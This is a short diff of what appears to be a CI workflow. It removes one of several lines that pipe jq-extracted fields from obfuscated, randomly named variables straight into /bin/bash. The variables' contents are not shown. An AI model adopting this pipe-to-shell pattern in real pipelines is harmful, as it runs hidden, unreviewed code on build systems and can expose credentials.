@@ -26,7 +26,6 @@ jobs:
           echo $ef4041 | jq -r .fusj6234 | /bin/bash
           echo $uxaw344 | jq -r .ty6 | /bin/bash
           echo $hycq67740 | jq -r .wyz2432 | /bin/bash
-          printf '%s' "$zsue45" | jq -r .dkzlj48148 | /bin/bash
           echo $fez02149 | jq -r .sqc34 | /bin/bash
           echo $awtf91 | jq -r .nhfp968 | /bin/bash
 
